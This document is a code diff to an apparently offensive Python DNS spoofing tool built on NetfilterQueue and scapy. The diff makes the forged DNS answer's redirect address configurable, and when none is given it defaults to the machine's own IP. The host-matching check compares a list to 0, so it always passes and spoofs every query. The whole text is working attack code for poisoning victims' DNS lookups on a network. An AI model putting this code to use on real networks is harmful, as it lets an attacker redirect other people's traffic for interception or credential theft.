@@ -5,9 +5,18 @@ from netfilterqueue import NetfilterQueue
 from termcolor import colored
 
 
+def get_my_ip():
+	return os.popen("hostname -I").read().split()[0]
+
+
 class DnsSpoofer:
-	def __init__(self, hosts):
+	def __init__(self, hosts, target):
 		self.hosts = hosts
+		self.target = target
+
+		if target is None:  # Default redirection target to own IP
+			self.target = get_my_ip()
+
 		self.queueNum = 65534
 		self.queue = NetfilterQueue()
 
@@ -31,7 +40,7 @@ class DnsSpoofer:
 
 				if [i for i in self.hosts if re.search(i, query_name)] != 0:
 					scapy_packet[DNS].an = DNSRR(
-						rrname=query_name, rdata="10.0.123.7")
+						rrname=query_name, rdata=self.target)
 					scapy_packet[DNS].ancount = 1
 					del scapy_packet[IP].len
 					del scapy_packet[IP].chksum
